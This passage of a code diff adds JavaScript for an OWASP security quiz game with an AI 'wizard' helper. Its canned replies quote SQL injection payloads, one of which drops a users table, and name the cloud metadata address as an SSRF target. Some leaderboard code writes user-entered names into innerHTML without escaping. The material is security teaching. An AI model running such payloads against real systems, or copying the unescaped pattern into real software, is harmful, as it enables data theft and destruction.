+  document.getElementById('qpanel').classList.remove('open');
+  // Update rank based on zone as soon as we step into a new tier
+  var zoneRank = 'paige';
+  if (stoneIdx >= 11) zoneRank = 'knight';
+  else if (stoneIdx >= 6) zoneRank = 'squire';
+  if (zoneRank !== state.rank) {
+    state.rank = zoneRank;
+    updateHUD();
+    saveState();
+  }
+  // Switch music when entering a new zone
+  Music.changeZone(zoneRank);
+}
+
+function onReachedWaypoint(){
+  if(stoneIdx >= WAYPOINTS.length-1){
+    charAction='victory'; gameState='VICTORY';
+    setTimeout(showVictory, 1200);
+    return;
+  }
+  charAction='idle';
+  openQuestion();
+}
+
+function openQuestion(){
+  var ch = CHALLENGES[stoneIdx-1];
+  if(!ch){ walkToNextStone(); return; }
+  current = ch;
+  answered = false;
+
+  // Shuffle options
+  var opts = ch.options.map(function(o,i){return {text:o,idx:i};});
+  for(var i=opts.length-1;i>0;i--){
+    var j=Math.floor(Math.random()*(i+1));
+    var tmp=opts[i];opts[i]=opts[j];opts[j]=tmp;
+  }
+  shuffledOpts = opts;
+  shuffledCorrect = opts.findIndex(function(o){return o.idx===ch.correct;});
+
+  charAction='idle';
+  gameState='QUESTIONING';
+  renderQuestion(ch);
+  setTimeout(function(){document.getElementById('qpanel').classList.add('open');}, 250);
+
+  addWizMsg('wiz','⚔️ Stone <strong>'+stoneIdx+'</strong>: <em>'+ch.title+'</em> ('+ch.topic+'). Ask me for hints!');
+  renderSidebar();
+}
+
+function renderQuestion(ch){
+  var rc={paige:{c:'#7BA7D4',l:'🛡️ Paige'},squire:{c:'#C0976A',l:'⚔️ Squire'},knight:{c:'#E8A820',l:'👑 Knight'}};
+  var r=rc[ch.rank||'paige'];
+  var tag=document.getElementById('qpTag');
+  tag.textContent=r.l+' · '+ch.topic;
+  tag.style.color=r.c; tag.style.borderColor=r.c+'44';
+  document.getElementById('qpSub').textContent='OWASP Challenge #'+stoneIdx;
+  document.getElementById('qpXp').textContent='+'+ch.xp+' XP';
+  document.getElementById('qpTitle').textContent=ch.title;
+  document.getElementById('qpBody').textContent=ch.body;
+  var codeEl=document.getElementById('qpCode');
+  if(ch.code){codeEl.style.display='block';codeEl.textContent=ch.code;}
+  else codeEl.style.display='none';
+
+  var opts=document.getElementById('qpOpts');
+  opts.innerHTML='';
+  var letters=['A','B','C','D'];
+  shuffledOpts.forEach(function(o,i){
+    var btn=document.createElement('button');
+    btn.type='button';
+    btn.className='opt'; btn.id='opt'+i;
+    (function(idx){ btn.addEventListener('click', function(){ pickAnswer(idx); }); })(i);
+    // DOM node creation like codex — avoids innerHTML/browser color quirks
+    var badge=document.createElement('span');
+    badge.className='oltr';
+    badge.textContent=letters[i];
+    var txt=document.createElement('span');
+    txt.textContent=o.text;
+    btn.appendChild(badge);
+    btn.appendChild(txt);
+    opts.appendChild(btn);
+  });
+
+  document.getElementById('qpExpl').className='expl';
+  document.getElementById('qpExpl').textContent='';
+  document.getElementById('nxtBtn').className='nxt';
+}
+
+function pickAnswer(idx){
+  if(answered||!current) return;
+  answered=true;
+  var isCorrect = idx === shuffledCorrect;
+
+  shuffledOpts.forEach(function(_,i){
+    var btn=document.getElementById('opt'+i);
+    if(!btn) return;
+    btn.disabled=true;
+    if(i===shuffledCorrect) btn.classList.add('correct');
+    else if(i===idx&&!isCorrect) btn.classList.add('wrong');
+  });
+
+  var expl=document.getElementById('qpExpl');
+  expl.textContent=current.explanation;
+  expl.className='expl show '+(isCorrect?'ck':'wk');
+  document.getElementById('nxtBtn').className='nxt show';
+
+  if(isCorrect){
+    var prevXP=state.xp;
+    state.xp+=current.xp;
+    if(!state.completed.includes(current.id)) state.completed.push(current.id);
+    checkRankUp(prevXP);
+    saveState(); updateHUD(); renderSidebar();
+    charAction='victory';
+    // XP popup
+    var pop=document.createElement('div');
+    pop.className='xppop';
+    pop.textContent='+'+current.xp+' XP!';
+    pop.style.left=(window.innerWidth*.4)+'px';
+    pop.style.top=(window.innerHeight*.45)+'px';
+    document.body.appendChild(pop);
+    setTimeout(function(){pop.remove();},1600);
+    burst(window.innerWidth*.42, window.innerHeight*.5, '#2ECC8A');
+    addWizMsg('wiz','🎉 <strong>Correct!</strong> +'+current.xp+' XP! The realm grows safer!');
+  } else {
+    state.misses = (state.misses || 0) + 1;
+    saveState();
+    charAction='stumble';
+    setTimeout(function(){charAction='idle';},1000);
+    var missesLeft = 3 - state.misses;
+    if (state.misses >= 3) {
+      // 3 misses — dragon defeats the knight
+      addWizMsg('wiz','💀 <strong>Three wrong answers!</strong> The dragon has defeated you. The realm needs a stronger knight...');
+      setTimeout(function(){
+        showDragonAttack();
+        setTimeout(showDefeatScreen, 2000);
+      }, 300);
+    } else {
+      addWizMsg('wiz','⚠️ Not quite. Correct answer: <strong>'+escHtml(shuffledOpts[shuffledCorrect].text)+'</strong>. ⚠️ <strong>'+(missesLeft === 1 ? 'ONE warning left!' : missesLeft+' warnings left')+' — 3 wrong = defeat!</strong>');
+      setTimeout(showDragonAttack, 300);
+    }
+  }
+}
+
+function onNext(){
+  document.getElementById('qpanel').classList.remove('open');
+  charAction='idle';
+  setTimeout(walkToNextStone, 450);
+}
+
+function showDefeatScreen(){
+  document.getElementById('dragon-overlay').classList.remove('active');
+  var ov=document.createElement('div');
+  ov.className='overlay';
+  ov.innerHTML='<div class="mcard" style="text-align:center;border-color:rgba(232,64,64,.5)">' +
+    '<span style="font-size:3.5rem;display:block;margin-bottom:14px">💀🐉</span>' +
+    '<h2 style="background:linear-gradient(135deg,#E84040,#FF6060);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text">Defeated!</h2>' +
+    '<p>The dragon has bested you after <strong style="color:#E84040">3 wrong answers</strong>.<br>The realm needs a stronger knight!</p>' +
+    '<p style="margin-top:4px;font-family:JetBrains Mono,monospace;font-size:.75rem;color:#7A8BAA">XP earned this run: <strong style="color:#E8A820">' + state.xp + '</strong></p>' +
+    '<div style="display:flex;gap:8px;margin-top:18px">' +
+    '<button class="bgold" style="flex:1" onclick="resetGame()">⚔️ Try Again</button>' +
+    '</div></div>';
+  document.body.appendChild(ov);
+}
+
+function showVictory(){
+  var ov=document.createElement('div');
+  ov.className='overlay';
+  ov.innerHTML='<div class="mcard" style="text-align:center"><h2>Quest Complete! 👑</h2>'+
+    '<p style="font-size:2.8rem;margin:14px 0">🏆</p>'+
+    '<p>You are a true <strong style="color:#E8A820">Security Knight</strong>!<br>Total XP: <strong style="color:#FFD700">'+state.xp+'</strong></p>'+
+    '<div style="display:flex;gap:8px;margin-top:18px"><button class="bgold" onclick="this.closest(\'.overlay\').remove()">Keep Exploring</button>'+
+    '<button class="bghost" onclick="resetGame()">↺ Play Again</button></div></div>';
+  document.body.appendChild(ov);
+}
+
+// ═══════════════════════════════════════════════
+// RANK & BADGES
+// ═══════════════════════════════════════════════
+function checkRankUp(prevXP){
+  // Rank is zone-based: which tier of stone you're currently on
+  // Stones 1-5 = Paige, 6-10 = Squire, 11-15 = Knight
+  var newRank = 'paige';
+  if (stoneIdx >= 11) newRank = 'knight';
+  else if (stoneIdx >= 6) newRank = 'squire';
+
+  if (newRank !== state.rank) {
+    state.rank = newRank;
+  }
+
+  // Paige badge: complete first challenge
+  if(!state.badges.includes('paige') && state.completed.length >= 1){
+    state.badges.push('paige');
+    showBadge('paige');
+    return;
+  }
+  // Squire badge: enter squire zone (stone 6+)
+  if(!state.badges.includes('squire') && stoneIdx >= 6){
+    state.badges.push('squire');
+    showBadge('squire');
+    return;
+  }
+  // Knight badge: enter knight zone (stone 11+) OR complete all 15
+  if(!state.badges.includes('knight') && (stoneIdx >= 11 || state.completed.length >= 15)){
+    state.badges.push('knight');
+    showBadge('knight');
+  }
+}
+
+function showBadge(rank){
+  var d={
+    paige: {e:'🛡️',t:'Paige Badge!',p:'First challenge conquered! The quest begins.'},
+    squire:{e:'⚔️',t:'Squire Badge!',p:'You have risen to the rank of Squire!'},
+    knight:{e:'👑',t:'Knight Badge!',p:'You are a true Security Knight!'}
+  };
+  var bd=d[rank];
+  document.getElementById('bdgEmoji').textContent=bd.e;
+  document.getElementById('bdgTitle').textContent=bd.t;
+  document.getElementById('bdgDesc').textContent=bd.p;
+  document.getElementById('bdgModal').classList.remove('hidden');
+}
+
+function updateHUD(){
+  var rank=state.rank, xp=state.xp;
+  // XP bar: show progress within current zone (5 questions per zone)
+  // Zone XP caps: Paige ~75, Squire ~110 more (185 total), Knight ~125 more (310 total)
+  var zoneRanges = { paige:[0,75], squire:[75,185], knight:[185,310] };
+  var r = zoneRanges[rank] || [0,75];
+  var pct = Math.min(100, Math.max(0, ((xp - r[0]) / (r[1] - r[0])) * 100));
+  document.getElementById('xpFill').style.width=pct+'%';
+  document.getElementById('xpLbl').textContent=xp+' XP';
+  var rb=document.getElementById('rankBadge');
+  rb.textContent=RANK_ICONS[rank]+' '+RANK_LABELS[rank];
+  rb.className='rbadge '+RANK_CSS[rank];
+  RANK_ORDER.forEach(function(r){
+    var id=r==='paige'?'bp':r==='squire'?'bs':'bk';
+    var el=document.getElementById(id);
+    if(state.badges.includes(r) && !el.classList.contains('earned')){
+      el.classList.add('earned');
+    }
+  });
+  // Update miss dots
+  var misses = state.misses || 0;
+  for (var m=1; m<=3; m++) {
+    var dot = document.getElementById('md'+m);
+    if (dot) dot.classList.toggle('hit', m <= misses);
+  }
+}
+
+function saveState(){localStorage.setItem('sk4_state',JSON.stringify(state));}
+
+function resetGame(){
+  localStorage.removeItem('sk4_state');
+  sessionStorage.removeItem('sk4_key');
+  location.reload();
+}
+
+// ═══════════════════════════════════════════════
+// SIDEBAR QUEST LIST
+// ═══════════════════════════════════════════════
+function renderSidebar(){
+  var tiers=[
+    {key:'paige',cnt:'pcnt',list:'pquests',color:'var(--pc)',range:[0,4]},
+    {key:'squire',cnt:'scnt',list:'squests',color:'var(--sc)',range:[5,9]},
+    {key:'knight',cnt:'kcnt',list:'kquests',color:'var(--kc)',range:[10,14]}
+  ];
+  tiers.forEach(function(tier){
+    var chs=CHALLENGES.slice(tier.range[0],tier.range[1]+1);
+    var done=chs.filter(function(c){return state.completed.includes(c.id);}).length;
+    document.getElementById(tier.cnt).textContent=done+'/5';
+    var container=document.getElementById(tier.list);
+    container.innerHTML='';
+    chs.forEach(function(ch,li){
+      var globalIdx=tier.range[0]+li+1;
+      var isDone=state.completed.includes(ch.id);
+      var isCur=stoneIdx===globalIdx;
+      var isLocked=!isDone&&stoneIdx<globalIdx;
+      var div=document.createElement('div');
+      div.className='sb-item'+(isDone?' done':'')+(isCur?' active':'')+(isLocked?' locked':'');
+      div.innerHTML='<div class="sb-name">'+escHtml(ch.title)+'</div>'+
+        '<div class="sb-meta"><span class="sb-xp">+'+ch.xp+' XP</span>'+escHtml(ch.topic||'')+'</div>'+
+        '<span class="sb-check">'+(isDone?'✅':isLocked?'🔒':'⚔️')+'</span>';
+      container.appendChild(div);
+    });
+  });
+}
+
+// ═══════════════════════════════════════════════
+// UI TOGGLES
+// ═══════════════════════════════════════════════
+function toggleSidebar(){
+  sidebarShown=!sidebarShown;
+  document.getElementById('sidebar-left').classList.toggle('collapsed',!sidebarShown);
+  document.getElementById('btnQuests').classList.toggle('active',sidebarShown);
+  resizeCanvas();
+}
+
+function toggleWizard(){
+  wizShown=!wizShown;
+  document.getElementById('wpanel').classList.toggle('collapsed',!wizShown);
+  document.getElementById('btnWiz').classList.toggle('active',wizShown);
+  resizeCanvas();
+}
+
+function toggleMusic(){
+  Music.toggle();
+}
+
+// ═══════════════════════════════════════════════
+// WIZARD & AI
+// ═══════════════════════════════════════════════
+var WIZARD_SYSTEM='You are Merlin, a wise medieval security wizard. Help with OWASP Top 10 and secure coding in a warm, encouraging medieval tone. Under 150 words. Use bullet points for steps. Reference the current challenge if relevant.';
+
+function sendWizard(){
+  var input=document.getElementById('winput');
+  var text=input.value.trim();
+  if(!text||wizBusy) return;
+  input.value='';
+  addWizMsg('user', escHtml(text));
+  callWizard(text);
+}
+
+function askHint(type){
+  if(wizBusy) return;
+  var topic = current ? current.topic : 'secure coding';
+  var prompts={
+    hint: 'Give a hint for "'+topic+'" without revealing the answer.',
+    explain: 'Explain '+topic+' — how does this attack work?',
+    realworld: 'Give a real-world example of a '+topic+' attack.',
+    prevent: 'How do I prevent '+topic+' vulnerabilities? Give code examples.'
+  };
+  var labels={hint:'💡 Hint',explain:'📖 Explain',realworld:'🌍 Real example',prevent:'🛡️ Prevention'};
+  addWizMsg('user', labels[type]);
+  callWizard(prompts[type]);
+}
+
+function callWizard(text){
+  wizBusy=true;
+  var typing=addTyping();
+  if(demoMode||!apiKey){
+    setTimeout(function(){typing.remove();addWizMsg('wiz',getDemoReply(text));wizBusy=false;},800+Math.random()*500);
+    return;
+  }
+  var ctx_note = current ? ' (Current topic: '+current.topic+')' : '';
+  fetch('https://api.anthropic.com/v1/messages',{
+    method:'POST',
+    headers:{'Content-Type':'application/json','x-api-key':apiKey,'anthropic-version':'2023-06-01','anthropic-dangerous-direct-browser-access':'true'},
+    body:JSON.stringify({model:'claude-sonnet-4-6',max_tokens:350,system:WIZARD_SYSTEM,messages:[{role:'user',content:text+ctx_note}]})
+  })
+  .then(function(r){return r.json();})
+  .then(function(d){
+    typing.remove();
+    var reply=d.content&&d.content[0]?d.content[0].text:'The crystal ball is cloudy — please try again.';
+    addWizMsg('wiz',mdToHtml(reply));
+    wizBusy=false;
+  })
+  .catch(function(e){
+    typing.remove();
+    addWizMsg('wiz','⚠️ Wizard connection failed: '+e.message+'. Check your API key!');
+    wizBusy=false;
+  });
+}
+
+function getDemoReply(text){
+  var t=text.toLowerCase();
+  if(t.includes('hint')) return '💡 <strong>A nudge from Merlin:</strong> Think about where <em>user-controlled data</em> flows — does it cross a trust boundary without being validated? That\'s often where sorcery strikes!';
+  if(t.includes('sql')||t.includes('injection')) return '⚔️ <strong>SQL Injection</strong> lets attackers manipulate queries by injecting SQL syntax.<br><br>• Input: <code>\' OR 1=1--</code> returns all rows<br>• Input: <code>\'; DROP TABLE users;--</code> destroys data<br><br>🛡️ Shield: Parameterized queries — data never becomes code.';
+  if(t.includes('xss')||t.includes('cross-site script')) return '🧙 <strong>XSS</strong> lets attackers inject scripts into pages others view.<br><br>• Stored XSS: saved in database, hits every visitor<br>• Reflected XSS: bounced off server in URL<br>• DOM XSS: manipulates the page client-side<br><br>🛡️ Shield: Encode output, use textContent, add CSP header.';
+  if(t.includes('csrf')) return '⚔️ <strong>CSRF</strong> tricks your browser into making requests you never intended.<br><br>• Evil site embeds a hidden form/image<br>• Your browser sends cookies automatically<br><br>🛡️ Shield: CSRF tokens, SameSite=Strict cookies.';
+  if(t.includes('password')||t.includes('hash')) return '🔐 Password hashing guidelines:<br><br>• ✅ bcrypt (cost 12+)<br>• ✅ Argon2id (recommended by OWASP)<br>• ✅ scrypt<br>• ❌ MD5 — cracked in milliseconds<br>• ❌ SHA-256 — too fast for passwords<br>• ❌ Plain text — catastrophic';
+  if(t.includes('jwt')) return '🧙 <strong>JWT attacks:</strong><br><br>• <strong>alg:none</strong> — strips signature verification<br>• Algorithm confusion (RS256 → HS256)<br>• Weak secrets bruteforceable with jwt-cracker<br><br>🛡️ Shield: Pin algorithm server-side, reject "none", rotate secrets.';
+  if(t.includes('csrf')||t.includes('ssrf')) return '🏰 <strong>SSRF</strong> makes the server fetch internal resources on an attacker\'s behalf.<br><br>• Target: http://169.254.169.254 (AWS metadata)<br>• Can expose cloud credentials<br><br>🛡️ Shield: Allowlist URLs, block private IP ranges.';
+  if(t.includes('race')||t.includes('toctou')) return '⚔️ <strong>Race Conditions</strong> occur when two operations both pass a check before either completes.<br><br>🛡️ Shield:<br>• Database row-level locking (SELECT FOR UPDATE)<br>• Optimistic locking with version fields<br>• Atomic operations';
+  if(t.includes('real')||t.includes('example')) return '🌍 <strong>Real-world examples:</strong><br><br>• <strong>Equifax 2017</strong>: Apache Struts CVE exploited (OWASP A06)<br>• <strong>Twitter 2022</strong>: API auth bypass exposed 5.4M accounts (IDOR)<br>• <strong>Log4Shell 2021</strong>: JNDI injection via log messages<br>• <strong>SolarWinds 2020</strong>: Supply chain attack via build system';
+  if(t.includes('prevent')||t.includes('fix')||t.includes('shield')) return '🛡️ <strong>General secure coding principles:</strong><br><br>• Validate and sanitize ALL user inputs<br>• Use parameterized queries (never string concat)<br>• Apply least privilege everywhere<br>• Authenticate AND authorize every request<br>• Keep dependencies updated<br>• Log security events and alert on anomalies';
+  return '🧙 <strong>Merlin speaks!</strong> I can help with any OWASP vulnerability — just ask about SQL Injection, XSS, CSRF, JWT, race conditions, SSRF, file uploads, and more! In demo mode I use pre-written wisdom. Add your Anthropic API key for full real-time guidance.';
+}
+
+function addWizMsg(role,html){
+  var wm=document.getElementById('wmsgs');
+  var d=document.createElement('div');
+  d.className='wm '+role; d.innerHTML=html;
+  wm.appendChild(d); wm.scrollTop=wm.scrollHeight; return d;
+}
+function addTyping(){
+  var wm=document.getElementById('wmsgs');
+  var d=document.createElement('div');
+  d.className='wm wiz';
+  d.innerHTML='<div class="wtyp"><span></span><span></span><span></span></div>';
+  wm.appendChild(d); wm.scrollTop=wm.scrollHeight; return d;
+}
+function mdToHtml(md){
+  return md.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/\*\*([^*]+)\*\*/g,'<strong>$1</strong>')
+    .replace(/\*([^*]+)\*/g,'<em>$1</em>')
+    .replace(/`([^`]+)`/g,'<code style="font-family:JetBrains Mono,monospace;font-size:.75rem;background:rgba(255,255,255,.08);padding:1px 5px;border-radius:3px">$1</code>')
+    .replace(/\n/g,'<br>');
+}
+
+// ═══════════════════════════════════════════════
+// PARTICLES
+// ═══════════════════════════════════════════════
+function burst(x,y,col){
+  for(var i=0;i<18;i++){
+    var p=document.createElement('div');
+    p.className='pt';
+    var a=(Math.PI*2/18)*i, d=60+Math.random()*80;
+    p.style.cssText='left:'+(x-4)+'px;top:'+(y-4)+'px;width:'+(4+Math.random()*6)+'px;height:'+(4+Math.random()*6)+'px;background:'+(Math.random()>.5?col:'#FFD700')+';--tx:'+(Math.cos(a)*d)+'px;--ty:'+(Math.sin(a)*d)+'px;animation-duration:'+(0.5+Math.random()*.5)+'s;animation-delay:'+(Math.random()*.1)+'s;';
+    document.body.appendChild(p);
+    setTimeout(function(el){el.remove();},1100,p);
+  }
+}
+
+// ═══════════════════════════════════════════════
+// PATH & ORDER SYSTEM
+// ═══════════════════════════════════════════════
+var gameMode = localStorage.getItem('sk4_mode') || null; // 'solo' | 'order'
+var orderData = JSON.parse(localStorage.getItem('sk4_order') || 'null') || null;
+
+var ORDER_COLORS = [
+  '#E8A820','#E84040','#2ECC8A','#7BA7D4','#C0976A',
+  '#9B59B6','#E74C3C','#1ABC9C','#F39C12','#3498DB'
+];
+var selectedColor = ORDER_COLORS[0];
+
+// Simulated Order members (realistic demo data)
+var SIM_MEMBERS = [
+  {name:'CyberWarden',  role:'Grand Marshal', xp:310, avatar:'CW', color:'#E8A820'},
+  {name:'NetSentinel',  role:'Commander',     xp:285, avatar:'NS', color:'#2ECC8A'},
+  {name:'CodeGuard',    role:'Knight',        xp:240, avatar:'CG', color:'#7BA7D4'},
+  {name:'DataShield',   role:'Knight',        xp:190, avatar:'DS', color:'#C0976A'},
+  {name:'PhishHunter',  role:'Squire',        xp:155, avatar:'PH', color:'#9B59B6'},
+  {name:'ByteKnight',   role:'Squire',        xp:120, avatar:'BK', color:'#E84040'},
+];
+
+// Simulated Siege leaderboard
+var SIM_SIEGE_ORDERS = [
+  {name:'Iron Citadel',    xp:1240, mine:false},
+  {name:'Dark Sentinels',  xp:980,  mine:false},
+  {name:'Byte Wardens',    xp:750,  mine:false},
+  {name:'Code Crusaders',  xp:610,  mine:false},
+];
+
+// ── Path selection ──────────────────────────────
+function showPathModal() {
+  document.getElementById('pathModal').classList.add('open');
+}
+
+function choosePath(mode) {
+  if (mode === 'solo') {
+    gameMode = 'solo';
+    localStorage.setItem('sk4_mode', 'solo');
+    document.getElementById('pathModal').classList.remove('open');
+    document.getElementById('keyModal').classList.remove('hidden');
+  } else {
+    document.getElementById('pathModal').classList.remove('open');
+    document.getElementById('orderCreateModal').classList.add('open');
+    initColorPicker();
+  }
+}
+
+function goBack() {
+  document.getElementById('orderCreateModal').classList.remove('open');
+  showPathModal();
+}
+
+// ── Colour picker ───────────────────────────────
+function initColorPicker() {
+  var row = document.getElementById('colorRow');
+  row.innerHTML = '';
+  ORDER_COLORS.forEach(function(col, i) {
+    var d = document.createElement('div');
+    d.className = 'color-opt' + (i === 0 ? ' sel' : '');
+    d.style.background = col;
+    d.style.color = col;
+    d.onclick = function() {
+      document.querySelectorAll('.color-opt').forEach(function(x){ x.classList.remove('sel'); });
+      d.classList.add('sel');
+      selectedColor = col;
+      updateOrderPreview();
+    };
+    row.appendChild(d);
+  });
+}
+
+function updateOrderPreview() {
+  var name = document.getElementById('orderNameInput').value.trim() || 'The Iron Coders';
+  var motto = document.getElementById('orderMottoInput').value.trim() || 'Secure by default, defended by honour';
+  document.getElementById('previewName').textContent = '⚔️ ' + name;
+  document.getElementById('previewName').style.color = selectedColor;
+  document.getElementById('previewMotto').textContent = '"' + motto + '"';
+}
+
+function foundOrder() {
+  var name = document.getElementById('orderNameInput').value.trim();
+  var motto = document.getElementById('orderMottoInput').value.trim();
+  if (!name) {
+    document.getElementById('orderNameInput').style.borderColor = 'var(--crim)';
+    setTimeout(function(){ document.getElementById('orderNameInput').style.borderColor = ''; }, 1500);
+    return;
+  }
+  orderData = { name: name, motto: motto || 'For the realm!', color: selectedColor, founded: new Date().toISOString(), role: 'Grand Marshal' };
+  gameMode = 'order';
+  localStorage.setItem('sk4_mode', 'order');
+  localStorage.setItem('sk4_order', JSON.stringify(orderData));
+  document.getElementById('orderCreateModal').classList.remove('open');
+  // Show order tabs
+  document.getElementById('sbOrderTab').style.display = '';
+  document.getElementById('sbSiegeTab').style.display = '';
+  // Start game
+  document.getElementById('keyModal').classList.remove('hidden');
+  renderOrderPanel();
+  initSiege();
+}
+
+// ── Sidebar tab switching ────────────────────────
+function switchSbTab(btn) {
+  document.querySelectorAll('.sb-tab').forEach(function(t){ t.classList.remove('active'); });
+  document.querySelectorAll('.sb-panel').forEach(function(p){ p.classList.remove('active'); });
+  btn.classList.add('active');
+  var panel = document.getElementById(btn.getAttribute('data-panel'));
+  if (panel) panel.classList.add('active');
+}
+
+// ── Order Panel rendering ───────────────────────
+function renderOrderPanel() {
+  if (!orderData) return;
+
+  // Banner
+  var nameEl = document.getElementById('orderNameEl');
+  nameEl.textContent = '⚔️ ' + orderData.name;
+  nameEl.style.color = orderData.color;
+  document.getElementById('orderMottoEl').textContent = '"' + orderData.motto + '"';
+  document.getElementById('orderBannerEl').style.borderColor = orderData.color + '44';
+
+  // My XP in order total
+  var myXP = state.xp || 0;
+  var simTotal = SIM_MEMBERS.reduce(function(s,m){ return s+m.xp; }, 0);
+  var orderTotal = myXP + simTotal;
+  document.getElementById('orderTotalXP').textContent = orderTotal;
+  document.getElementById('orderMemberCount').textContent = SIM_MEMBERS.length + 1;
+  document.getElementById('orderRankEl').textContent = '#' + Math.max(1, 4 - Math.floor(myXP/100));
+  document.getElementById('orderZone').textContent = myXP >= 200 ? '2' : myXP >= 50 ? '1' : '—';
+
+  // Members list — me first
+  var list = document.getElementById('membersList');
+  list.innerHTML = '';
+  var me = { name: 'You', role: orderData.role, xp: myXP, avatar: 'ME', color: orderData.color, isMe: true };
+  var allMembers = [me].concat(SIM_MEMBERS).sort(function(a,b){ return b.xp-a.xp; });
+  allMembers.forEach(function(m, i) {
+    var div = document.createElement('div');
+    div.className = 'om-member' + (m.isMe ? ' me' : '');
+    div.innerHTML = '<div class="om-avatar" style="background:' + m.color + '22;border:1px solid' + m.color + '44;color:' + m.color + '">' + m.avatar + '</div>' +
+      '<div class="om-info"><div class="om-name">' + (m.isMe ? '⭐ ' + m.name : m.name) + '</div><div class="om-role">' + m.role + '</div></div>' +
+      '<div class="om-xp">' + m.xp + ' XP</div>';
+    list.appendChild(div);
+  });
+}
+
+// ── Siege Event ─────────────────────────────────
+var siegeTimer = null;
+var siegeEndTime = null;
+var siegeActive = false;
+var siegeScore = 0;
+
+var SIEGE_THEMES = [
+  { name:"The Shadow Sorcerer's Challenge",  icon:'🔥', topic:'Injection Spells',    challengeIds:[1,3,6,11,23] },
+  { name:"The Dragon's Cryptographic Trial", icon:'🐉', topic:'Cryptography & Auth', challengeIds:[3,8,13,21,24] },
+  { name:"The Realm Siege of Dark Forest",   icon:'⚔️', topic:'Access Control',      challengeIds:[2,7,12,19,22] },
+];
+var currentSiege = null;
+var siegeChallengeIdx = 0;
+var siegeAnswered = 0;
+
+function initSiege() {
+  // Pick this week's siege based on week number
+  var weekNum = Math.floor(Date.now() / (7*24*60*60*1000));
+  currentSiege = SIEGE_THEMES[weekNum % SIEGE_THEMES.length];
+
+  // Siege ends in ~7 days from Monday; for demo show a realistic countdown
+  var now = new Date();
+  var monday = new Date(now);
+  monday.setDate(now.getDate() - now.getDay() + 1); // This Monday
+  monday.setHours(0,0,0,0);
+  siegeEndTime = new Date(monday.getTime() + 7*24*60*60*1000); // Next Monday
+
+  document.getElementById('siegeEventName').textContent = currentSiege.name;
+  renderSiegeLeaderboard();
+  renderSiegeAction();
+  startSiegeTimer();
+}
+
+function startSiegeTimer() {
+  if (siegeTimer) clearInterval(siegeTimer);
+  siegeTimer = setInterval(function() {
+    var now = Date.now();
+    var diff = Math.max(0, siegeEndTime - now);
+    var h = Math.floor(diff / 3600000);
+    var m = Math.floor((diff % 3600000) / 60000);
+    var s = Math.floor((diff % 60000) / 1000);
+    document.getElementById('siegeTimerVal').textContent =
+      String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
+  }, 1000);
+}
+
+function renderSiegeLeaderboard() {
+  var myXP = state.xp || 0;
+  var myOrder = orderData ? { name: orderData.name, xp: myXP + Math.floor(myXP*0.3), mine: true } : null;
+  var allOrders = SIM_SIEGE_ORDERS.slice();
+  if (myOrder) {
+    allOrders.push(myOrder);
+    allOrders.sort(function(a,b){ return b.xp-a.xp; });
+  }
+  var lb = document.getElementById('siegeLeaderboard');
+  lb.innerHTML = '';
+  var medals = ['🥇','🥈','🥉'];
+  allOrders.forEach(function(o, i) {
+    var div = document.createElement('div');
+    div.className = 'siege-lb-row' + (o.mine ? ' mine' : '');
+    div.innerHTML = '<div class="siege-lb-rank ' + ['gold','silver','bronze'][i] + '">' + (medals[i] || (i+1)) + '</div>' +
+      '<div class="siege-lb-name">' + (o.mine ? '⭐ ' : '') + o.name + '</div>' +
+      '<div class="siege-lb-xp">' + o.xp + ' XP</div>';
+    lb.appendChild(div);
+  });
+}
+
+function renderSiegeAction() {
+  var el = document.getElementById('siegeAction');
+  var siDone = parseInt(localStorage.getItem('sk4_siege_done') || '0');
+  if (siDone >= (currentSiege ? currentSiege.challengeIds.length : 5)) {
+    el.innerHTML = '<div class="siege-done">✅ <strong>Siege contribution complete!</strong><br>Your Order has your XP. Check back next Monday!</div>';
+  } else {
+    el.innerHTML = '<button class="siege-start-btn" onclick="startSiegeChallenge()">⚔️ Fight the Siege! (' + siDone + '/5 done)</button>';
+  }
+}
+
+function startSiegeChallenge() {
+  // Run a siege challenge — uses a special challenge from the theme
+  var siDone = parseInt(localStorage.getItem('sk4_siege_done') || '0');
   if (siDone >= 5) { renderSiegeAction(); return; }
-  var pool = ALL_CHALLENGES.paige.concat(ALL_CHALLENGES.squire).concat(ALL_CHALLENGES.knight);
-  var challengeId=currentSiege.challengeIds[siDone];
-  var ch = pool.find(function(c){ return c.id === challengeId; }) || pool[0];
-  activeSiegeChallenge = { id: ch.id };
-  current = ch; answered = false; prepareQuestion(ch); renderQuestion(ch);
-  document.getElementById('qpTag').textContent='🔥 SIEGE · '+ch.topic; document.getElementById('qpTag').style.color='#E84040'; document.getElementById('qpTag').style.borderColor='#E84040';
-  document.getElementById('qpXp').textContent='+'+(ch.xp*2)+' XP ⚔️ SIEGE'; document.getElementById('qpSub').textContent='Weekly Siege Challenge '+(siDone+1)+' of 5';
-  gameState='QUESTIONING'; document.getElementById('qpanel').classList.add('open');
+  var challengeId = currentSiege.challengeIds[siDone];
+  var ch = ALL_CHALLENGES.paige.concat(ALL_CHALLENGES.squire).concat(ALL_CHALLENGES.knight)
+    .find(function(c){ return c.id === challengeId; });
+  if (!ch) { ch = ALL_CHALLENGES.knight[siDone % ALL_CHALLENGES.knight.length]; }
+
+  // Briefly close qpanel and load a siege-themed question
+  current = ch;
+  answered = false;
+  // Shuffle options
+  var opts = ch.options.map(function(o,i){return {text:o,idx:i};});
+  for (var i=opts.length-1;i>0;i--){ var j=Math.floor(Math.random()*(i+1)); var tmp=opts[i];opts[i]=opts[j];opts[j]=tmp; }
+  shuffledOpts = opts;
+  shuffledCorrect = opts.findIndex(function(o){return o.idx===ch.correct;});
+  stoneIdx = Math.max(stoneIdx, 1);
+  renderQuestion(ch);
+
+  // Override header to show SIEGE styling
+  document.getElementById('qpTag').textContent = '🔥 SIEGE · ' + ch.topic;
+  document.getElementById('qpTag').style.color = '#E84040';
+  document.getElementById('qpTag').style.borderColor = '#E84040';
+  document.getElementById('qpXp').textContent = '+' + (ch.xp*2) + ' XP ⚔️ SIEGE';
+  document.getElementById('qpSub').textContent = 'Weekly Siege Challenge ' + (siDone+1) + ' of 5';
+  gameState = 'QUESTIONING';
+  document.getElementById('qpanel').classList.add('open');
+
+  // Intercept pickAnswer to also advance siege progress
+  var origPick = window._origSiegePick || pickAnswer;
+  if (!window._siegeHooked) {
+    window._siegeHooked = true;
+    var realPick = pickAnswer;
+    window.pickAnswer = function(idx) {
